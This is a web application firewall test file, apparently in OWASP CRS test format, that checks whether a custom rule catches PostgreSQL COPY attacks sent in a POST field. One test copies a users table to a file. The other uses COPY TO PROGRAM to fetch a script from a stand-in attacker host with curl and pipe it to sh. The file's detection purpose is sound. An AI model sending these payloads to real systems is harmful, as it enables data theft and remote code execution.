---
meta:
  author: "JiuZhang WAF Team"
  description: CUSTOM_PACK unauth-access tests (self-developed)
rule_id: 1001916
tests:
  - test_id: 1
    desc: "PostgreSQL COPY TO file exfiltration"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: shop.example.com
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: 'sql=copy (select * from users) to ''/tmp/users.csv'''
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1001916]
  - test_id: 2
    desc: "PostgreSQL COPY TO PROGRAM command execution"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: shop.example.com
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Content-Type: application/x-www-form-urlencoded
          method: POST
          port: 80
          uri: "/post"
          data: 'sql=copy (select 1) to program ''curl http://evil.example/x.sh|sh'''
          version: HTTP/1.1
        output:
          log:
            expect_ids: [1001916]
